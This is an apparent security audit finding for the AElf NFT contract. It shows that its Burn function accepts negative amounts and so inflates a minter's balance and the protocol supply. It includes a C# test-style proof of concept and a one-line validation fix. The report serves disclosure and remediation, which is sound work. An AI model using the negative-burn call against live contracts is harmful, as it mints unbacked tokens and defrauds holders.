# Audit Report

## Title
Negative Amount Bypass in NFT Burn Function Allows Arbitrary Balance Inflation

## Summary
The NFT contract's `Burn` function lacks validation for negative input amounts, allowing minters to arbitrarily inflate their NFT balances, protocol supply, and token quantities. When a negative amount is passed, the subtraction operation mathematically becomes addition, enabling unlimited NFT creation beyond protocol constraints.

## Finding Description

The vulnerability exists in the `Burn` function where it directly manipulates balances using `SafeMath.Sub()` without validating that the input amount is non-negative. [1](#0-0) 

The input amount field is defined as a signed `int64` type in the protobuf definition, allowing negative values. [2](#0-1) 

While the `DoTransfer` helper function properly validates against negative amounts with an explicit check, [3](#0-2)  the `Burn` function performs direct balance manipulation without calling `DoTransfer` or implementing equivalent validation.

When a negative amount is passed (e.g., `-1000`), the security check `State.BalanceMap[tokenHash][Context.Sender] >= input.Amount` at line 91 passes because any positive balance is greater than a negative number. Subsequently, the `SafeMath.Sub()` operation with a negative operand results in addition due to the mathematical identity: `a - (-b) = a + b`. [4](#0-3) 

For comparison, the MultiToken contract's `Burn` function properly validates amounts by calling `AssertValidToken`, which internally validates that `amount > 0`. [5](#0-4) [6](#0-5) 

## Impact Explanation

**Critical Supply Invariant Violation:**
- Minters can inflate their NFT balance to arbitrary amounts (e.g., from 50 to 1,050 NFTs with a single malicious call)
- Protocol supply can exceed `TotalSupply` limits, breaking the fundamental NFT scarcity guarantee enforced during minting [7](#0-6) 
- Token quantity becomes inconsistent with actual minted amounts
- Enables unlimited NFT creation beyond protocol constraints without paying minting costs

**Affected Parties:**
- Existing NFT holders suffer severe dilution of their holdings
- NFT marketplace integrity is completely compromised
- Protocol economic model breaks down entirely
- Trust in the NFT platform is destroyed

This represents a complete breakdown of the token supply management system, equivalent to unlimited money printing.

## Likelihood Explanation

**Highly Likely to be Exploited:**

The `Burn` function is a public RPC method accessible to any caller. [8](#0-7) 

**Feasible Preconditions:**
- Attacker must be in the minter list for the target NFT protocol
- This is realistic as legitimate minters exist for every NFT protocol
- Minters are added through the `AddMinters` function by the protocol creator
- No other special permissions or complex contract states required

**Execution Practicality:**
- Single transaction with negative amount parameter
- No complex state setup or timing requirements
- Immediate and guaranteed success if attacker has minter privileges
- Zero gas cost constraints since operation succeeds immediately

**Economic Rationality:**
- Extremely rational for any malicious minter
- Effectively free NFT creation with zero minting cost
- Profit potential unlimited based on NFT market value
- Could be used to manipulate NFT markets or rug-pull investors

## Recommendation

Add explicit validation that the amount parameter is positive before performing any balance operations. The fix should mirror the validation used in `DoTransfer` and the MultiToken contract:

```csharp
public override Empty Burn(BurnInput input)
{
    // Add this validation at the beginning
    Assert(input.Amount > 0, "Invalid burn amount.");
    
    var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
    var nftInfo = GetNFTInfoByTokenHash(tokenHash);
    var nftProtocolInfo = State.NftProtocolMap[input.Symbol];
    Assert(nftProtocolInfo.IsBurnable,
        $"NFT Protocol {nftProtocolInfo.ProtocolName} of symbol {nftProtocolInfo.Symbol} is not burnable.");
    var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
    Assert(
        State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
        minterList.Value.Contains(Context.Sender),
        "No permission.");
    State.BalanceMap[tokenHash][Context.Sender] = State.BalanceMap[tokenHash][Context.Sender].Sub(input.Amount);
    nftProtocolInfo.Supply = nftProtocolInfo.Supply.Sub(input.Amount);
    nftInfo.Quantity = nftInfo.Quantity.Sub(input.Amount);
    // ... rest of function
}
```

## Proof of Concept

```csharp
[Fact]
public async Task NegativeAmountBurnInflatesBalance()
{
    // Setup: Create NFT protocol and mint initial NFTs
    var symbol = await CreateTest();
    await AddMinterAsync(symbol);
    
    var tokenHash = (await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        Quantity = 50,
        Owner = MinterAddress
    })).Output;
    
    // Verify initial balance
    var initialBalance = await NFTContractStub.GetBalanceByTokenHash.CallAsync(
        new GetBalanceByTokenHashInput
        {
            Owner = MinterAddress,
            TokenHash = tokenHash
        });
    initialBalance.Balance.ShouldBe(50);
    
    // Exploit: Burn with negative amount
    await MinterNFTContractStub.Burn.SendAsync(new BurnInput
    {
        Symbol = symbol,
        TokenId = 1,
        Amount = -1000  // Negative amount!
    });
    
    // Verify balance was inflated instead of decreased
    var finalBalance = await NFTContractStub.GetBalanceByTokenHash.CallAsync(
        new GetBalanceByTokenHashInput
        {
            Owner = MinterAddress,
            TokenHash = tokenHash
        });
    
    // Balance should be 50 - (-1000) = 1050 (EXPLOITED!)
    finalBalance.Balance.ShouldBe(1050);
    
    // Protocol supply also inflated
    var protocolInfo = await NFTContractStub.GetNFTProtocolInfo.CallAsync(
        new StringValue { Value = symbol });
    protocolInfo.Supply.ShouldBe(1050); // Was 50, now 1050
}
```

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L46-55)
```csharp
    private void DoTransfer(Hash tokenHash, Address from, Address to, long amount)
    {
        if (amount < 0) throw new AssertionException("Invalid transfer amount.");

        if (amount == 0) return;

        Assert(State.BalanceMap[tokenHash][from] >= amount, "Insufficient balance.");
        State.BalanceMap[tokenHash][from] = State.BalanceMap[tokenHash][from].Sub(amount);
        State.BalanceMap[tokenHash][to] = State.BalanceMap[tokenHash][to].Add(amount);
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L82-111)
```csharp
    public override Empty Burn(BurnInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var nftInfo = GetNFTInfoByTokenHash(tokenHash);
        var nftProtocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(nftProtocolInfo.IsBurnable,
            $"NFT Protocol {nftProtocolInfo.ProtocolName} of symbol {nftProtocolInfo.Symbol} is not burnable.");
        var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
        Assert(
            State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
            minterList.Value.Contains(Context.Sender),
            "No permission.");
        State.BalanceMap[tokenHash][Context.Sender] = State.BalanceMap[tokenHash][Context.Sender].Sub(input.Amount);
        nftProtocolInfo.Supply = nftProtocolInfo.Supply.Sub(input.Amount);
        nftInfo.Quantity = nftInfo.Quantity.Sub(input.Amount);

        State.NftProtocolMap[input.Symbol] = nftProtocolInfo;
        if (nftInfo.Quantity == 0 && !nftProtocolInfo.IsTokenIdReuse) nftInfo.IsBurned = true;

        State.NftInfoMap[tokenHash] = nftInfo;

        Context.Fire(new Burned
        {
            Burner = Context.Sender,
            Symbol = input.Symbol,
            Amount = input.Amount,
            TokenId = input.TokenId
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L405-405)
```csharp
        Assert(protocolInfo.Issued <= protocolInfo.TotalSupply, "Total supply exceeded.");
```

**File:** protobuf/nft_contract.proto (L45-47)
```text
    // Destroy nfts.
    rpc Burn (BurnInput) returns (google.protobuf.Empty) {
    }
```

**File:** protobuf/nft_contract.proto (L182-186)
```text
message BurnInput {
    string symbol = 1;
    int64 token_id = 2;
    int64 amount = 3;
}
```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L92-98)
```csharp
    public static long Sub(this long a, long b)
    {
        checked
        {
            return a - b;
        }
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L81-86)
```csharp
    private void AssertValidSymbolAndAmount(string symbol, long amount)
    {
        Assert(!string.IsNullOrEmpty(symbol) && IsValidSymbol(symbol),
            "Invalid symbol.");
        Assert(amount > 0, "Invalid amount.");
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L323-337)
```csharp
    private Empty Burn(Address address, string symbol, long amount)
    {
        var tokenInfo = AssertValidToken(symbol, amount);
        Assert(tokenInfo.IsBurnable, "The token is not burnable.");
        ModifyBalance(address, symbol, -amount);
        tokenInfo.Supply = tokenInfo.Supply.Sub(amount);

        Context.Fire(new Burned
        {
            Burner = address,
            Symbol = symbol,
            Amount = amount
        });
        return new Empty();
    }
```
